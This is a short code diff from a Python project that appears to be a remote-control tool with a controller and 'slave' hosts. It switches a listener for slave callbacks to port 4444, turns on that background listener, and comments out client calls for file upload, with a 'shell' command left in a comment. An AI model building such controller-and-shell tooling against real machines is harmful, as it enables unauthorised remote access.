@@ -23,7 +23,7 @@ class BackGround:
         }
     
     
-    def recv_slaveAddr(self,target = "0.0.0.0",port = 9998):
+    def recv_slaveAddr(self,target = "0.0.0.0",port = 4444):
         """接收被控制端的ip和它开启的端口,并将信息保存到配置文件里,方便后续可视化
         用多进程技术
 
@@ -325,15 +325,15 @@ class LuckyGirl:
 
 
 if __name__ == "__main__":
-    a = LuckyGirl('127.0.0.1',12345)
+    # a = LuckyGirl('127.0.0.1',12345)
     
-    a.connect_server()
-    a.send_msg('upload',['save.txt','save5.txt'])
+    # a.connect_server()
+    # a.send_msg('upload',['save.txt','save5.txt'])
     # a.send_msg('shell',['shell','Bxx#>'])
     # a.choose['upload']()
     
-    # b = BackGround()
-    # background_process = multiprocessing.Process(target=b.recv_slaveAddr)
-    # background_process.start()
+    b = BackGround()
+    background_process = multiprocessing.Process(target=b.recv_slaveAddr)
+    background_process.start()
     pass
     
